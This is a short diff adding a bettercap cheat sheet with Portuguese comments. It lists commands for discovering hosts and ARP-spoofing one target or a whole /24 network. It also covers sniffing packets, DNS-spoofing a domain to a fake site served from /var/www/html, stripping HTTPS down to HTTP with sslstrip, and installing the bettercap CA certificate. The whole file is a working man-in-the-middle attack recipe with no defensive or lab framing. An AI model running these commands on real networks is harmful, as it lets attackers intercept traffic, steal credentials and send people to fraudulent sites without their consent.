@@ -1,0 +1,54 @@
+ _          _   _                           
+| |__   ___| |_| |_ ___ _ __ ___ __ _ _ __  
+| '_ \ / _ \ __| __/ _ \ '__/ __/ _` | '_ \ 
+| |_) |  __/ |_| ||  __/ | | (_| (_| | |_) |
+|_.__/ \___|\__|\__\___|_|  \___\__,_| .__/ 
+                                     |_|    
+
+#manda pacotes pra todos na rede pra identificar todos os ips.
+net.probe on
+
+#fica de olho na entrada e saida de hosts.
+net.recon on 
+
+#ver todos os hosts achados.
+net.show
+------------------------------------------------------------------------
+#direcionar o trafego de um alvo.
+set arp.spoof.targets <ip alvo>
+
+#direcionar todo o trafego da rede.
+set arp.spoof.targets <ip local 0/24>
+
+#iniciar a captura de pacotes.
+arp.spoof on
+
+#capturar os pacotes da rede.
+net.sniff on
+------------------------------------------------------------------------
+#definir o dominio. 
+set dns.spoof.domains <exemplo.com>
+
+#definir o ip alvo
+set dns.spoof.address <192.169.1.0>
+
+#ligar o spoof do dns.
+dns.spoof on
+
+#local onde por o site falso.
+/var/www/html
+------------------------------------------------------------------------
+#liga o sslstrip quando for fazer o downgrade do https pra http
+set http.proxy.sslstrip true
+
+#reinicia o http proxy 
+http.proxy off
+http.proxy on
+------------------------------------------------------------------------
+#adicionando certificado do bettercap
+sudo cp /root/.bettercap-ca.cert.pem /usr/local/share/ca-certificates/bettercap.crt
+
+
+#atualizando os certificados
+sudo update-ca-certificates
+
